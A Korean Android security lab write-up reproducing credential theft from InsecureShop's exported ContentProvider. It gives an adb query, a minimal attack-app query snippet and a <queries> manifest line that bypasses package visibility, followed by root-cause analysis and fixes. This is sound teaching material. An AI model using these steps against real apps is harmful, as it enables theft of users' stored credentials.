---
layout: post
title: "[Android 앱 보안 S06] 컴포넌트 노출 실증"
date: 2026-09-02 14:00:00 +0900
category: 안드로이드
author: WTCY
tags: [Android, AndroidSecurity, 모바일보안, ContentProvider, exported, 커스텀권한, 패키지가시성, IPC, InsecureShop, 학습기록]
excerpt: "S03에서 지도로만 봤던 exported 컴포넌트를 이번엔 실제로 두드려 봤습니다. InsecureShop의 exported ContentProvider는 로그인한 사용자의 아이디·비밀번호를 그대로 돌려줍니다. 그걸 '보호'한다는 커스텀 권한이 normal이라, 직접 만든 공격 앱이 설치만으로 그 권한을 받아 자격증명을 통째로 훔쳐 화면에 찍었습니다. 대신 최신 안드로이드의 패키지 가시성이라는 문턱 하나를 넘어야 했습니다."
---

> S03에서 InsecureShop의 exported 표면을 정적으로 그렸습니다. 이번엔 그중 ContentProvider를 실제로 호출해, 다른 앱이 자격증명을 훔칠 수 있는지 끝까지 확인합니다.

exported 컴포넌트가 위험한 이유는 "다른 앱이 부를 수 있다"에서 끝나지 않습니다. 그 컴포넌트가 민감한 걸 돌려줄 때 위험이 완성됩니다. InsecureShop의 exported ContentProvider가 정확히 그렇습니다. 그래서 이번엔 지도를 보는 데서 멈추지 않고, 직접 공격 앱을 하나 만들어 그 provider에서 자격증명을 뽑아 화면에 찍었습니다.

---

## 실습 목표

- exported ContentProvider가 무엇을 돌려주는지 확인한다.
- 그것을 "보호"하는 커스텀 권한의 실제 보호 수준을 확인한다.
- 커스텀 권한만 요청하는 공격 앱을 만들어 자격증명 절도를 재현한다.
- exported Service·Activity의 외부 호출도 확인한다.

---

## 윤리적 범위와 허가 조건

피해 앱은 내가 소유한 교육용 InsecureShop, 공격 앱은 내가 직접 작성한 최소 앱(`com.aas.stealer`)입니다. 두 앱 모두 `aas-api33` 에뮬레이터 안에서만 돌렸고, 훔친 자격증명은 이 앱에 원래 박혀 있는 테스트 계정(`shopuser`)입니다.

---

## 환경 및 도구 버전

- 대상 기기: `aas-api33` (S01), 피해 앱: `com.insecureshop` (S02)
- 공격 앱 빌드: S05에서 세운 손빌드 툴체인(`aapt2`+`javac`+`d8`+`apksigner`)
- 정적 근거: S03의 디컴파일 결과

---

## 위협 모델 — 노출의 완성 조건

- exported ContentProvider가 민감 데이터를 돌려주는가?
- 그것을 지키는 권한이 실제로 지키는가(protectionLevel)?
- 다른 앱이 그 권한을 얻어 provider에 닿을 수 있는가(패키지 가시성 포함)?

---

## 재현 절차

### 1. provider가 무엇을 돌려주는가 (정적)

S03에서 `InsecureShopProvider`가 `exported="true"`에 `readPermission="com.insecureshop.permission.READ"`인 걸 봤습니다. 디컴파일한 `query()`는 이렇게 생겼습니다.

```java
// content://com.insecureshop.provider/insecure  (matcher code 100)
MatrixCursor cursor = new MatrixCursor(new String[]{"username", "password"});
strArr[0] = Prefs.INSTANCE.getUsername();
strArr[1] = Prefs.INSTANCE.getPassword();
cursor.addRow(strArr);
return cursor;
```

provider가 SharedPreferences에 저장된(S04) 아이디·비밀번호를 그대로 커서에 담아 돌려줍니다. 즉 이 provider를 부를 수 있으면 로그인 자격증명이 통째로 나옵니다.

### 2. 셸에서 먼저 확인

로그인한 상태에서 `content` 도구로 직접 질의하면 자격증명이 나옵니다.

```console
$ adb shell content query --uri content://com.insecureshop.provider/insecure
Row: 0 username=shopuser, password=!ns3csh0p
```

### 3. 커스텀 권한의 실제 보호 수준

`content://` 질의를 막아야 할 `com.insecureshop.permission.READ`는 S03에서 봤듯 `protectionLevel`이 없어 `normal`입니다. normal 권한은 설치 시 사용자 확인 없이 자동 부여됩니다. 이걸 공격 앱에서 확인했습니다 — 매니페스트에 권한 한 줄만 넣고 설치했더니,

```console
$ adb shell dumpsys package com.aas.stealer | grep 'insecureshop.permission.READ'
com.insecureshop.permission.READ: granted=true
```

사용자에게 아무것도 묻지 않고 이미 부여돼 있습니다. "보호"가 없는 것과 같습니다.

### 4. 공격 앱으로 자격증명 절도

이제 provider를 질의해 자격증명을 화면에 찍는 최소 공격 앱을 만들었습니다. 핵심은 이 한 줄입니다.

```java
Cursor c = getContentResolver().query(
    Uri.parse("content://com.insecureshop.provider/insecure"), null, null, null, null);
// c.getString(0) = username, c.getString(1) = password
```

그런데 처음엔 `cursor = null`이 나왔습니다. logcat에 답이 있었습니다.

```console
E ActivityThread: Failed to find provider info for com.insecureshop.provider
```

권한 문제가 아니라 최신 안드로이드의 패키지 가시성(package visibility, API 30+) 때문입니다. targetSdk 30 이상 앱은 다른 패키지를 기본적으로 볼 수 없어서, provider의 authority조차 해석하지 못합니다. 공격자 입장에선 문턱이 하나 생긴 셈인데, 넘는 건 매니페스트 한 줄입니다.

```xml
<queries>
    <package android:name="com.insecureshop"/>
    <provider android:authorities="com.insecureshop.provider"/>
</queries>
```

이걸 넣고 다시 빌드·설치·실행하자, 공격 앱이 provider에서 자격증명을 그대로 읽어 화면에 찍었습니다.

### 5. exported Service도 외부에서 시작

같은 맥락으로 exported된 `UploadService`도 셸에서 바로 시작됩니다.

```console
$ adb shell am start-service -n com.insecureshop/net.gotev.uploadservice.UploadService
Starting service: Intent { cmp=com.insecureshop/net.gotev.uploadservice.UploadService }
```

exported Activity들(AboutUs·Result 등)은 S03에서 로그인 없이 열리는 걸 이미 확인했습니다. 참고로 이 앱은 매니페스트에 exported된 BroadcastReceiver는 두지 않았습니다(리시버 클래스는 코드에 있지만 매니페스트 컴포넌트로 노출되진 않음).

---

## 스크린샷

내가 만든 공격 앱 `com.aas.stealer`의 실행 화면입니다. 이 앱이 가진 건 자동 부여된 normal 권한 하나뿐인데, exported ContentProvider에서 피해 앱의 아이디·비밀번호를 그대로 뽑아 냈습니다.

![공격 앱 ProviderStealer 실행 화면 — "holds: com.insecureshop.permission.READ (normal → auto-granted)", provider 질의 결과 columns [username][password], "STOLEN username = shopuser / STOLEN password = !ns3csh0p"](/assets/img/android-app-security/S06/01-provider-stolen.png)

공격 앱 소스와 셸 질의·권한 부여 원문은 `assets/evidence/android-app-security/S06/`에 남겼습니다.

---

## 관측 결과

- exported ContentProvider(`content://com.insecureshop.provider/insecure`)가 로그인 자격증명(아이디·비밀번호)을 그대로 돌려준다.
- 그것을 지켜야 할 커스텀 권한이 `normal`이라, 공격 앱에 설치만으로 자동 부여됐다(`granted=true`).
- 패키지 가시성(API 30+)이 한 번 막아 주지만, `<queries>` 한 줄로 넘긴 뒤 공격 앱이 자격증명을 절도했다.
- exported Service도 외부에서 시작되고, exported Activity는 로그인 없이 열린다(S03).

---

## 근본 원인과 보안 영향

- 민감 데이터를 IPC 표면(ContentProvider)으로 내보내면서, 보호는 normal 권한에 맡긴 게 결정적 실수입니다. normal은 보호가 아닙니다.
- 커스텀 권한으로 컴포넌트를 지키려면 `protectionLevel="signature"`여야 합니다. 그래야 같은 개발자 키로 서명한 앱만 접근합니다.
- 애초에 자격증명 같은 값을 provider로 내보내는 것 자체가 잘못입니다. 외부에 열 이유가 없는 컴포넌트는 `exported="false"`로 닫아야 합니다.
- 패키지 가시성은 완화책이지 방어가 아닙니다. 공격자는 `<queries>`로 쉽게 넘습니다. 실제 방어는 컴포넌트를 닫고 권한을 signature로 거는 것입니다.

## 수정 방법

- `InsecureShopProvider`를 `exported="false"`로 닫는다(꼭 외부 공유가 필요하면 별도 최소 데이터만, signature 권한으로).
- `com.insecureshop.permission.READ`를 `android:protectionLevel="signature"`로 선언한다.
- 자격증명은 provider로 내보내지 않는다. 세션은 서버 토큰으로 관리한다(S04·S05).

수정 후에는 같은 공격 앱을 설치해도 권한이 자동 부여되지 않고(`signature`라 서명 불일치), provider 질의가 거부되어야 합니다.

---

## 재검증

셸 질의와 공격 앱, 두 경로가 같은 자격증명(`shopuser`/`!ns3csh0p`)을 돌려줬습니다. 그 값은 S04에서 SharedPreferences로 읽은 값과도 일치합니다. provider가 저장소의 그 값을 그대로 내보낸다는 게 세 경로로 교차 확인됐습니다.

---

## 참고 자료

- Android Developers — `<provider>` exported, `android:permission`/`readPermission`
- Android Developers — 커스텀 권한과 `protectionLevel="signature"`
- Android Developers — 패키지 가시성(`<queries>`, API 30+)
